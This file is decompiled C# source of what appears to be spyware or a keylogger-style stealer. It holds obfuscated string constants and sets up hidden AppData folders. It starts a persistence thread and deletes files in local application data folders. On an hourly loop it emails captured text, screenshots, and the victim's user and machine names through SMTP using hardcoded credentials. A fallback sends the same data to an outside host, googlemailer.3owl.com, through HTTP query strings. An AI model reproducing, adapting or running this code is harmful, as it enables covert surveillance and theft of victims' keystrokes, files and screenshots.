using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using My;

public class OJNLOC
{
	public static string BTXIGXF;

	public static string LJIYONE;

	public static string WBUSGXM;

	public static string FFInfo;

	public static string SKGPOMQ;

	public static string TCEDCOX;

	public static string GJWMGVC;

	public static string EYVUYGQ;

	public static string QYLCWEG;

	public static string PJNXOYT;

	public static string KTOLCBJ;

	public static string HCUSHTV;

	public static string KJQFLEY;

	public static string YHMWXNW;

	public static string DLTJKSLS = "";

	public static string RLLJRGCW = NFHDYHPI.VIUFICML("mai6v6WYqLq1r4q5goqEjK2su7BTo7q/JQ==", "False");

	public static string KEQEFKDP = NFHDYHPI.VIUFICML("kLeChKuWoKq+sIiiJQ==", "False");

	public static string CMSTUGMV = NFHDYHPI.VIUFICML("mK2/wnKMray7sFOjur8l", "False");

	public static int UKMJGUON = 587;

	public static string QDSHCHYI = NFHDYHPI.VIUFICML("DLEXSite", "False");

	public static string QJJIGGLP = NFHDYHPI.VIUFICML("USERSITE", "False");

	public static string GRPPCCEG = NFHDYHPI.VIUFICML("USERTYPE", "False");

	public static string KPHVWNKB = NFHDYHPI.VIUFICML("USERTITLE", "False");

	public static string HEQYIGWE = NFHDYHPI.VIUFICML("USERBODY", "False");

	public static string OPPRVDKU = NFHDYHPI.VIUFICML("USERSCREENSHOTS", "False");

	public static string HRKVLVGS = NFHDYHPI.VIUFICML("fbPJ17sP", "False");

	public static int WGYYVNQL = 3600000;

	public static string EQPVJCNC = "";

	public static string JLIYBQPN = "";

	public static int number = 0;

	public static KKVKSQ KOIIUI;

	public static Thread SLWHRW = new Thread(MKXYPN);

	public static Thread HJBIYT = new Thread(PDFHBE);

	public static Thread STRTTHRD = new Thread(DAStartup.Startupdll.StartPers);

	[STAThread]
	public static void Main()
	{
		try
		{
			IntPtr intPtr2 = (Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + NFHDYHPI.VIUFICML("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + NFHDYHPI.VIUFICML("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
			}
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + NFHDYHPI.VIUFICML("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + NFHDYHPI.VIUFICML("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + NFHDYHPI.VIUFICML("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), (SearchOption)3, new string[1] { "*.png*" }))
			{
				File.Delete(file);
			}
			foreach (string file2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + NFHDYHPI.VIUFICML("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
			{
				File.Delete(file2);
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			STRTTHRD.IsBackground = true;
			STRTTHRD.Start();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			KOIIUI = new KKVKSQ(JLIYBQPN);
			KKVKSQ.KXQNGO();
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
		try
		{
			SLWHRW.IsBackground = true;
			SLWHRW.Start();
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + NFHDYHPI.VIUFICML("naPW3cetwcOxyLPL1NO8ls/M4ICFvdvPvIXBzc/VrdDDCA==", "False");
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			FileInfo[] files = directoryInfo.GetFiles();
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				if (fileInfo.get_Name().Contains(NFHDYHPI.VIUFICML("h87Z3Myp0gQ=", "False")) | fileInfo.get_Name().Contains(NFHDYHPI.VIUFICML("b62wubBDgqrEoyM=", "False")))
				{
					fileInfo.Delete();
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			string path2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + NFHDYHPI.VIUFICML("g4+8zq+Trq6wjJC0srq1n56dxrWNq7m5uYMg", "False");
			string[] directories = Directory.GetDirectories(path2);
			foreach (object obj in directories)
			{
				string[] files2 = Directory.GetFiles(Conversions.ToString(obj));
				foreach (string text in files2)
				{
					if (text.Contains(NFHDYHPI.VIUFICML("q7zF08amxhA=", "False")) | text.Contains(NFHDYHPI.VIUFICML("l77JzLyZwhQ=", "False")))
					{
						File.Delete(text.ToString());
					}
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			HJBIYT.IsBackground = true;
			HJBIYT.Start();
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static void MKXYPN()
	{
		string text = "";
		checked
		{
			while (true)
			{
				Thread.Sleep(WGYYVNQL);
				text = "";
				string text2 = "";
				Thread.Sleep(100);
				try
				{
					WebClient webClient = new WebClient();
					text2 = NFHDYHPI.VIUFICML("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(NFHDYHPI.VIUFICML("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + NFHDYHPI.VIUFICML("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					text2 = "";
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(500);
				try
				{
					if (Operators.CompareString(JLIYBQPN, "", false) != 0)
					{
						EQPVJCNC = JLIYBQPN + Environment.NewLine + Environment.NewLine + text2 + Environment.NewLine + Environment.NewLine + text;
						try
						{
							MailMessage mailMessage = new MailMessage();
							MailMessage mailMessage2 = mailMessage;
							mailMessage2.From = new MailAddress(RLLJRGCW);
							mailMessage2.To.Add(RLLJRGCW);
							mailMessage2.Subject = NFHDYHPI.VIUFICML("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + NFHDYHPI.VIUFICML("aQ0=", "False") + Environment.MachineName.ToString();
							mailMessage2.Body = EQPVJCNC;
							try
							{
								if (Operators.CompareString(OPPRVDKU, NFHDYHPI.VIUFICML("mNHf1gY=", "False"), false) == 0)
								{
									Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + NFHDYHPI.VIUFICML("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + number + NFHDYHPI.VIUFICML("ZsPMzBI=", "False"));
									mailMessage2.Attachments.Add(item);
								}
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
							mailMessage2 = null;
							SmtpClient smtpClient = new SmtpClient(CMSTUGMV);
							SmtpClient smtpClient2 = smtpClient;
							smtpClient2.Port = UKMJGUON;
							smtpClient2.EnableSsl = true;
							smtpClient2.Credentials = new NetworkCredential(RLLJRGCW, KEQEFKDP);
							smtpClient2.Send(mailMessage);
							smtpClient2 = null;
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							try
							{
								string text3 = "http://googlemailer.3owl.com/index.php";
								_ = (HttpWebResponse)WebRequest.Create(text3 + "?to=" + RLLJRGCW + "&subject=" + Strings.Replace(NFHDYHPI.VIUFICML("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + NFHDYHPI.VIUFICML("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(EQPVJCNC, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + RLLJRGCW).GetResponse();
							}
							catch (Exception projectError4)
							{
								ProjectData.SetProjectError(projectError4);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
				EQPVJCNC = "";
				JLIYBQPN = "";
				DLTJKSLS = "";
				number++;
			}
		}
	}

	public static void PDFHBE()
	{
		_ = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + NFHDYHPI.VIUFICML("eoatrq+NrLOxsXp7pa6ok6m3pyw=", NFHDYHPI.VIUFICML("g7nP3cEJ", "False"))).Length;
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + NFHDYHPI.VIUFICML("eoatrq+NrLOxsXp7pa6ok6m3pyw=", NFHDYHPI.VIUFICML("g7nP3cEJ", "False")));
		FileInfo[] files = directoryInfo.GetFiles();
		try
		{
			Thread.Sleep(25000);
			string text = BTXIGXF.ToString() + Environment.NewLine + Environment.NewLine + LJIYONE + Environment.NewLine + Environment.NewLine + WBUSGXM + Environment.NewLine + Environment.NewLine + SKGPOMQ + Environment.NewLine + Environment.NewLine + TCEDCOX + Environment.NewLine + Environment.NewLine + GJWMGVC + Environment.NewLine + Environment.NewLine + EYVUYGQ + Environment.NewLine + Environment.NewLine + QYLCWEG + Environment.NewLine + Environment.NewLine + KTOLCBJ + Environment.NewLine + Environment.NewLine + HCUSHTV + Environment.NewLine + Environment.NewLine + KJQFLEY + Environment.NewLine + Environment.NewLine + YHMWXNW;
			if (!((Operators.CompareString(text, "", false) != 0) | (Operators.CompareString(text, (string)null, false) != 0)))
			{
				return;
			}
			try
			{
				MailMessage mailMessage = new MailMessage();
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.From = new MailAddress(RLLJRGCW);
				mailMessage2.To.Add(RLLJRGCW);
				mailMessage2.Subject = NFHDYHPI.VIUFICML("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + NFHDYHPI.VIUFICML("aQ0=", NFHDYHPI.VIUFICML("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
				mailMessage2.Body = text;
				try
				{
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						Attachment item = new Attachment(fileInfo.FullName);
						mailMessage2.Attachments.Add(item);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				mailMessage2 = null;
				SmtpClient smtpClient = new SmtpClient(CMSTUGMV);
				SmtpClient smtpClient2 = smtpClient;
				smtpClient2.Port = UKMJGUON;
				smtpClient2.EnableSsl = true;
				smtpClient2.Credentials = new NetworkCredential(RLLJRGCW, KEQEFKDP);
				smtpClient2.Send(mailMessage);
				smtpClient2 = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text2 = "http://googlemailer.3owl.com/index.php";
					_ = (HttpWebResponse)WebRequest.Create(text2 + "?to=" + RLLJRGCW + "&subject=" + Strings.Replace(NFHDYHPI.VIUFICML("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + NFHDYHPI.VIUFICML("aQ0=", NFHDYHPI.VIUFICML("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(text, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + RLLJRGCW).GetResponse();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}
}
